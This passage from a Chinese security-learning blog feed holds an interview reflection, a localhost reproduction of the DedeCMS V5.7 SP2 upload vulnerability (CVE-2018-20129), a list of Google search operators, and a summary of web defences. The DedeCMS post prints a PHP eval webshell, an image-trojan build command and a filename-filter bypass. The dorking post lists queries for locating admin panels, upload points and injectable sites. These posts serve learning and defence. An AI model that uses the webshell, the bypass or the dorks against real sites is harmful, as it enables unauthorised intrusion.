<img src="https://img-blog.csdnimg.cn/20200910095112326.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MjM4Nzc1,size_16,color_FFFFFF,t_70#pic_center" alt="img" loading="lazy"><br>
图片来自：https://blog.csdn.net/m0_46238775/article/details/108507660?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_baidulandingword-5&amp;spm=1001.2101.3001.4242</p>
<h1 id="面试小结">面试小结</h1>
<p>第一次面试，面试的对象还是字节，心里还是忐忑的。<br>
结果暂时未知，自我感觉不太好，暴露了些问题，需要去解决</p>
<ul>
<li>基础不牢，对语言的理解不够，还需要深入理解</li>
<li>算法丢人了，脑袋直接短路，练得还不够，加强code方面的练习--&gt;leetcode走起</li>
<li>继续学习，不要停下来！</li>
</ul>
<p>复习TCP/IP：https://blog.csdn.net/qzcsu/article/details/72861891?utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[DedeCMS V5.7 SP2前台文件上传漏洞(CVE-2018-20129)复现]]></title>
        <id>https://Morn-zh.github.io/post/dedecms-v57-sp2-qian-tai-wen-jian-shang-chuan-lou-dong-cve-2018-20129fu-xian/</id>
        <link href="https://Morn-zh.github.io/post/dedecms-v57-sp2-qian-tai-wen-jian-shang-chuan-lou-dong-cve-2018-20129fu-xian/">
        </link>
        <updated>2021-04-26T14:51:50.000Z</updated>
        <content type="html"><![CDATA[<h1 id="dedecms-v57-sp2前台文件上传漏洞cve-2018-20129复现">DedeCMS V5.7 SP2前台文件上传漏洞(CVE-2018-20129)复现</h1>
<h2 id="部署本地环境">部署本地环境</h2>
<h3 id="环境">环境</h3>
<p>phpstudy(Apache2.4.39+MySQL5.7.26+php5.2.17nts)</p>
<p>DedeCMS V5.7 SP2</p>
<h3 id="部署步骤">部署步骤</h3>
<p>1、将dedecms下载到本地后，将upload文件夹中的全部文件剪切到C:\phpStudy_64\phpstudy_pro\WWW\dedecms，其中dedecms为新建目录（可自定义</p>
<figure data-type="image" tabindex="1"><img src="https://Morn-zh.github.io/post-images/dedecms/Snipaste_2021-04-26_18-43-04.png" alt="Snipaste_2021-04-26_18-43-04" loading="lazy"></figure>
<p>2、开启Apache和MySQL</p>
<p>3、访问127.0.0.1/dedecms,会跳转到初始化界面，填上本地的数据库账号密码，一路下一步就行了</p>
<figure data-type="image" tabindex="2"><img src="https://Morn-zh.github.io/post-images/dedecms/Snipaste_2021-04-26_18-57-50.png" alt="Snipaste_2021-04-26_18-57-50" loading="lazy"></figure>
<h2 id="复现要求">复现要求</h2>
<p>登录的用户必须为<strong>管理员</strong>，不然没有<strong>上传权限</strong></p>
<h2 id="复现开始">复现开始</h2>
<h3 id="访问后台">访问后台</h3>
<p>因为系统已经给出了默认管理员用户，所以我们直接用这个账号（如果想要使用其他自己注册的账号，需要给这个账号管理员权限才行</p>
<p>默认账号：admin</p>
<p>默认密码：admin</p>
<p>访问后台：127.0.0.1/dedecms/dede</p>
<p>输入账号密码进行登录</p>
<figure data-type="image" tabindex="3"><img src="https://Morn-zh.github.io/post-images/dedecms/Snipaste_2021-04-26_19-03-42.png" alt="Snipaste_2021-04-26_19-03-42" loading="lazy"></figure>
<h3 id="访问个人中心">访问个人中心</h3>
<p>访问：127.0.0.1/dedecms/member</p>
<p>提示未开启会员功能</p>
<figure data-type="image" tabindex="4"><img src="https://Morn-zh.github.io/post-images/dedecms/Snipaste_2021-04-26_19-05-31.png" alt="Snipaste_2021-04-26_19-05-31" loading="lazy"></figure>
<p>解决方式</p>
<figure data-type="image" tabindex="5"><img src="https://Morn-zh.github.io/post-images/dedecms/Snipaste_2021-04-26_19-06-25.png" alt="Snipaste_2021-04-26_19-06-25" loading="lazy"></figure>
<p><strong>记得点确定！</strong></p>
<p>再次访问：127.0.0.1/dedecms/member</p>
<h3 id="进入内容中心">进入内容中心</h3>
<figure data-type="image" tabindex="6"><img src="https://Morn-zh.github.io/post-images/dedecms/Snipaste_2021-04-26_19-10-39.png" alt="Snipaste_2021-04-26_19-10-39" loading="lazy"></figure>
<p>这里会提示你完善个人信息，不管他，直接拉到最底下，点击提交就行</p>
<h3 id="进入发表文章的页面">进入发表文章的页面</h3>
<figure data-type="image" tabindex="7"><img src="https://Morn-zh.github.io/post-images/dedecms/Snipaste_2021-04-26_19-14-45.png" alt="Snipaste_2021-04-26_19-14-45" loading="lazy"></figure>
<h3 id="尝试上传jio本">尝试上传jio本</h3>
<p>1、首先上传正常的图片试试，点击上传到服务器，很明显，上传成功。并且，这里我们可以很明显的观察到图片被<strong>重命名</strong>了，这可能会对后面运行脚本造成麻烦，暂时先不管这个问题</p>
<figure data-type="image" tabindex="8"><img src="https://Morn-zh.github.io/post-images/dedecms/Snipaste_2021-04-26_19-17-18.png" alt="Snipaste_2021-04-26_19-17-18" loading="lazy"></figure>
<figure data-type="image" tabindex="9"><img src="https://Morn-zh.github.io/post-images/dedecms/Snipaste_2021-04-26_19-18-48.png" alt="Snipaste_2021-04-26_19-18-48" loading="lazy"></figure>
<figure data-type="image" tabindex="10"><img src="https://Morn-zh.github.io/post-images/dedecms/Snipaste_2021-04-26_19-20-52.png" alt="Snipaste_2021-04-26_19-20-52" loading="lazy"></figure>
<p>2、再尝试直接上传jio本（一句话木马）试试</p>
<figure data-type="image" tabindex="11"><img src="https://Morn-zh.github.io/post-images/dedecms/Snipaste_2021-04-26_19-25-58.png" alt="Snipaste_2021-04-26_19-25-58" loading="lazy"></figure>
<figure data-type="image" tabindex="12"><img src="https://Morn-zh.github.io/post-images/dedecms/Snipaste_2021-04-26_19-23-29.png" alt="Snipaste_2021-04-26_19-23-29" loading="lazy"></figure>
<p>被阻拦了，显示不是管理员允许的类型</p>
<p>3、试着改下后缀试试（Burp修改</p>
<figure data-type="image" tabindex="13"><img src="https://Morn-zh.github.io/post-images/dedecms/Snipaste_2021-04-26_19-27-23.png" alt="Snipaste_2021-04-26_19-27-23" loading="lazy"></figure>
<p>嗯？改下大小写似乎不太行</p>
<figure data-type="image" tabindex="14"><img src="https://Morn-zh.github.io/post-images/dedecms/Snipaste_2021-04-26_19-27-42.png" alt="Snipaste_2021-04-26_19-27-42" loading="lazy"></figure>
<p>4、再用%00绕过试试，顺便给它加上可能被允许的后缀</p>
<figure data-type="image" tabindex="15"><img src="https://Morn-zh.github.io/post-images/dedecms/Snipaste_2021-04-26_19-29-52.png" alt="Snipaste_2021-04-26_19-29-52" loading="lazy"></figure>
<p>好家伙，提示格式不对，似乎会对文件的类型进行检验</p>
<p>5、那就伪造一个图片木马</p>
<pre><code>GIF89A &lt;?php @eval($_POST['pass']) ?&gt;
</code></pre>
<p>命名为pic_muma.php.jpg</p>
<p>继续上传试试，似乎成功了</p>
<figure data-type="image" tabindex="16"><img src="https://Morn-zh.github.io/post-images/dedecms/Snipaste_2021-04-26_19-51-01.png" alt="Snipaste_2021-04-26_19-51-01" loading="lazy"></figure>
<p>注意到，返回了图片的路劲，我们去看看，结果发现，后缀名被改了，php后缀不见了，写入的一句话也不见了</p>
<p>6、看下后台代码吧</p>
<figure data-type="image" tabindex="17"><img src="https://Morn-zh.github.io/post-images/dedecms/Snipaste_2021-04-26_20-00-36.png" alt="Snipaste_2021-04-26_20-00-36" loading="lazy"></figure>
<p>看下图中的几个箭头，从上到下分别是</p>
<ul>
<li>去除文件名字中的特殊符号</li>
<li>确认文件名中是否存在系统允许的文件后缀</li>
<li>将图片类型小写</li>
<li>确认是否在系统允许的文件类型中</li>
</ul>
<p>分析下，主要的漏洞来自于第2点，正则匹配，说明只要里面有这个允许的后缀，不一定需要它在最后当后缀，于是有了如下的构造</p>
<pre><code>pic_muma.jpg.ph*p
</code></pre>
<p>首先将jpg写到文件名中间，那么最后运行的时候就不会被认为是jpg文件了。</p>
<p>后缀构建成ph*p（星号可以用上述中出现的符号代替）。这样在后台进行特殊符号剔除后，就会重新组合成php后缀</p>
<p>7、重新开始！</p>
<figure data-type="image" tabindex="18"><img src="https://Morn-zh.github.io/post-images/dedecms/Snipaste_2021-04-26_20-18-15.png" alt="Snipaste_2021-04-26_20-18-15" loading="lazy"></figure>
<p>上传成功，但是咋没给返回上传地址？</p>
<p>我们查看文件夹，其实已经上传上了，就是没返回地址……</p>
<figure data-type="image" tabindex="19"><img src="https://Morn-zh.github.io/post-images/dedecms/Snipaste_2021-04-26_20-16-50.png" alt="Snipaste_2021-04-26_20-16-50" loading="lazy"></figure>
<p>我直接疑惑，查看原文章说是太简易了，解析出错……</p>
<p>8、那我们重新做一个伪装更精细的~</p>
<pre><code>copy wula.jpg/b + muma.php new_muma.jpg
</code></pre>
<p>wula.jpg随便找的正常图片</p>
<p>/b指定为二进制形式</p>
<p>9、再再次上传</p>
<figure data-type="image" tabindex="20"><img src="https://Morn-zh.github.io/post-images/dedecms/Snipaste_2021-04-26_20-48-30.png" alt="Snipaste_2021-04-26_20-48-30" loading="lazy"></figure>
<p>好耶！查看文件</p>
<figure data-type="image" tabindex="21"><img src="https://Morn-zh.github.io/post-images/dedecms/Snipaste_2021-04-26_20-50-13.png" alt="Snipaste_2021-04-26_20-50-13" loading="lazy"></figure>
<p>10、上去了！试着用蚁剑连接下</p>
<figure data-type="image" tabindex="22"><img src="https://Morn-zh.github.io/post-images/dedecms/Snipaste_2021-04-26_20-52-05.png" alt="Snipaste_2021-04-26_20-52-05" loading="lazy"></figure>
<figure data-type="image" tabindex="23"><img src="https://Morn-zh.github.io/post-images/dedecms/Snipaste_2021-04-26_20-54-52.png" alt="Snipaste_2021-04-26_20-54-52" loading="lazy"></figure>
<p>好耶！+n</p>
<p>其实这个过程会出现如下情况，用浏览器查看php文件，会报语法错误，这时候不要慌，换个图片，或者手动将报错的那几行删除掉就行了~</p>
<h2 id="后记">后记</h2>
<p>有哪些避免检测的绕过方法？</p>
<p>正确的检测流程应该是怎么样？</p>
<p>后续有时间补充！</p>
<p>参考文章：</p>
<p>http://www.cnhonkerarmy.com/forum.php?mod=viewthread&amp;tid=155535</p>
<p><a href="https://www.php.cn/php-ask-430303.html">php一句话图片木马是怎么解析的？</a></p>
<h2 id=""></h2>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Google Hacking语法记录]]></title>
        <id>https://Morn-zh.github.io/post/google-hacking-yu-fa-ji-lu/</id>
        <link href="https://Morn-zh.github.io/post/google-hacking-yu-fa-ji-lu/">
        </link>
        <updated>2021-04-22T12:44:20.000Z</updated>
        <content type="html"><![CDATA[<h1 id="google-hacking">Google Hacking</h1>
<p>其实就是谷歌搜索的语法，某些参数在其他搜索引擎中也适用</p>
<h2 id="基本检索">基本检索</h2>
<ul>
<li>逻辑与：and</li>
<li>逻辑或： or</li>
<li>逻辑非： -</li>
<li>完整匹配：&quot;关键词&quot;</li>
<li>通配符：* ?</li>
</ul>
<pre><code>&quot;好玩的&quot; or &quot;好笑的&quot; -zhihu.com
</code></pre>
<p>完整匹配“好玩的”或者“好笑的”，排除知乎的结果</p>
<h2 id="高级检索">高级检索</h2>
<h3 id="site">site</h3>
<p>指定站点</p>
<h3 id="inurl">inurl</h3>
<p>指定url中的信息</p>
<h3 id="intitle">intitle</h3>
<p>指定标题中的信息</p>
<pre><code>site:bilibili.com inurl:搞笑 intitle:up主
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://Morn-zh.github.io/post-images/Google_Hacking/Snipaste_2021-04-22_20-17-56.png" alt="Snipaste_2021-04-22_20-17-56" loading="lazy"></figure>
<p>查看织梦cms的特征</p>
<pre><code>inurl:dede
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://Morn-zh.github.io/post-images/Google_Hacking/Snipaste_2021-04-22_20-52-25.png" alt="Snipaste_2021-04-22_20-52-25" loading="lazy"></figure>
<p><br>以上三个是经常遇到的，都是字面意思</p>
<br>
<h3 id="intext">intext</h3>
<p>在文本中</p>
<h3 id="allinurl">allinurl</h3>
<p>类似inurl，只不过可以指定多个关键词</p>
<h3 id="filetype">filetype</h3>
<p>指定文件类型</p>
<h3 id="link">link</h3>
<p>返回所有指向该url的页面</p>
<h3 id="related">related</h3>
<p>返回与该url类似的所有网站</p>
<h3 id="cache">cache</h3>
<p>返回关于该url的缓存页面</p>
<h2 id="常见的一些使用">常见的一些使用</h2>
<h3 id="查找网站后台">查找网站后台</h3>
<p>site:xx.com intext:管理<br>
site:xx.com inurl:login<br>
site:xx.com intitle:后台</p>
<h3 id="查看服务器使用的程序">查看服务器使用的程序</h3>
<p>site:xx.com filetype:asp<br>
site:xx.com filetype:php<br>
site:xx.com filetype:jsp<br>
site:xx.com filetype:aspx</p>
<h3 id="查看上传漏洞">查看上传漏洞</h3>
<p>site:xx.com inurl:file<br>
site:xx.com inurl:load</p>
<h3 id="查看可能存在sql注入的网站">查看可能存在SQL注入的网站</h3>
<pre><code>inurl:id=1
</code></pre>
<h2 id="后记">后记</h2>
<p>本篇主要是用来记录谷歌搜索引擎的相关语法，方便以后的信息收集</p>
<p>参考：</p>
<p>https://blog.csdn.net/qq_36119192/article/details/84029809（强烈推荐）</p>
<p>http://www.williamlong.info/archives/150.html</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[常见web漏洞防御措施汇总]]></title>
        <id>https://Morn-zh.github.io/post/chang-jian-web-lou-dong-fang-yu-cuo-shi-hui-zong/</id>
        <link href="https://Morn-zh.github.io/post/chang-jian-web-lou-dong-fang-yu-cuo-shi-hui-zong/">
        </link>
        <updated>2021-04-20T13:29:36.000Z</updated>
        <content type="html"><![CDATA[<h1 id="常见web漏洞防御措施汇总">常见web漏洞防御措施汇总</h1>
<p>将之前学到和看到的web漏洞做下汇总吧，加深记忆的同时也方便以后的查阅~</p>
<h2 id="sql注入">SQL注入</h2>
<p>1、使用预编译，绑定变量。使用预编译过的语句，SQL语义不会发生改变。</p>
<p>2、使用安全的存储过程</p>
<p>3、检查数据类型，包括但不限于数据的类型、数据的长度、数据的格式。</p>
<p>4、使用安全函数</p>
<p>5、限制网站用户的数据库权限</p>
<p>6、配置数据库安全参数</p>
<h2 id="xss跨站脚本">XSS跨站脚本</h2>
<p>1、使用HttpOnly，禁止页面的JS访问带有HttpOnly属性的Cookie（对抗Cookie劫持</p>
<p>2、输入检查（客户端和服务端都需要进行检查</p>
<p>3、输出检查（富文本输出、编码、转义</p>
<p>4、使用安全的编码函数</p>
<h2 id="csrf跨站请求伪造">CSRF跨站请求伪造</h2>
<p>1、验证码</p>
<p>2、Referer Check</p>
<p>3、Anti SCRF Token</p>
<h2 id="上传漏洞">上传漏洞</h2>
<p>1、文件扩展名校验</p>
<p>2、文件内容校验</p>
<p>3、上传文件重命名</p>
<p>4、文件上传目录设置权限</p>
<h2 id="ddos攻击">DDos攻击</h2>
<p>1、采用高性能的网络设备</p>
<p>2、高带宽</p>
<p>3、安装防火墙</p>
]]></content>
    </entry>
</feed>